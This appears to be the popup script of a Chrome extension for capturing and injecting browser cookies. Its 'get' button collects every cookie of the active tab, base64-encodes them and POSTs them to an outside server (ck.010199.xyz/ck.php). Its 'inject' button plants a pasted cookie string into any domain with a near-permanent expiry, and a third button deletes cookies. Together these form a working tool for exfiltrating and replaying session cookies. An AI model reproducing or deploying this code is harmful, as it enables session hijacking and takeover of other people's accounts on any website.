var URL = '';

function $$(id) {
    return document.getElementById(id);
}

function inj_cookies(cookies) {
    if (!cookies) {
        $$('status').innerHTML = 'No Cookies Injected.';
        return;
    }
    if (!chrome.cookies) {
        chrome.cookies = chrome.experimental.cookies;
    }

    var d = new Date();
    var expired = 365 * 70; // 70years
    var e = d.setTime(d.getTime() / 1000 + expired * 24 * 3600); // second

    var domain = URL.split('/')[2];
    if ($$('domain').value != domain) {
        domain = $$('domain').value;
    }
    var url = URL.split('/')[0] + '//' + domain;

    var cc = cookies.split(';');
    for (var i in cc) {
        var c = cc[i].replace(/^\s+|\s+$/g, "");
        if (!c) continue;
        var k = c.split('=')[0].replace(/^\s+|\s+$/g, "").replace(' ', '+');
        var v = c.split('=')[1].replace(/^\s+|\s+$/g, "").replace(' ', '+');
        chrome.cookies.set({
            'url': url,
            'name': k,
            'value': v,
            'path': '/',
            'domain': $$('domain').value,
            'expirationDate': e,
        });
    }
    $$('status').innerHTML = 'OK.';
}

function init() {
    $$('x').focus();
    $$('x').value = localStorage.getItem('cookies');

    var gcookies = '';
    var url = '';

    chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tab) {
        URL = tab[0].url;

        $$('domain').value = URL.split('/')[2];

        chrome.cookies.getAll({
            url: tab[0].url
        }, function (cookie) {
            console.log(cookie);
            url = tab[0].url;
            // 遍历当前域名下cookie, 拼接成字符串
            cookie.forEach(function (v) {
                gcookies += v.name + "=" + v.value + ";";
            });
        });
    });

    $$('x').addEventListener('blur', function () {
        localStorage.setItem('cookies', $$('x').value);
    });

    //inject cookie
    $$('exec_btn').addEventListener('click', function () {
        inj_cookies($$('x').value);
        var Endbase = btoa($$('x').value);
        console.log(Endbase);
    });

    // get cookie
    $$('get_btn').addEventListener('click', function () {
        var gcookies = '';

        chrome.cookies.getAll({ url: URL }, function (cookies) {
            cookies.forEach(function (cookie) {
                gcookies += cookie.name + "=" + cookie.value + ";"; // 拼接所有cookie为一个字符串
            });
            alert(gcookies);

            var Endck = btoa(gcookies);
            var token = $$('token_input').value;

            console.log("Encoded Cookies: " + Endck);

            // AJAX 
            $.ajax({
                url: "https://ck.010199.xyz/ck.php",  // 指定请求发送到的后端服务器地址
                type: 'post',
                data: JSON.stringify({
                    url: URL,
                    cookies: Endck,
                    token: token
                }),
                contentType: 'application/json',
                dataType: 'json',
                success: function (data) {
                    if (data.status === 'success') {
                        console.log("Report success: " + data.message);
                        $$('status').innerHTML = "Cookies sent successfully!";
                    } else {
                        console.log("Report error: " + data.message);
                        $$('status').innerHTML = "Error sending cookies.";
                    }
                },
                error: function (xhr, status, error) {
                    console.log("Report failure: " + error);
                    $$('status').innerHTML = "Failed to send cookies.";
                }
            });
        });
    });

    $$('rm_btn').addEventListener('click', function () {
        var domain = $(this).attr('data-domain');
        chrome.cookies.getAll({ domain: domain }, function (cks) {
            $.each(cks, function (i, ck) {
                var datack = {};
                datack.name = ck.name;
                datack.storeId = ck.storeId;
                datack.url = url;
                chrome.cookies.remove(datack);
            });
            alert("Del All Finish.");
        });
    });
}

document.addEventListener('DOMContentLoaded', init);
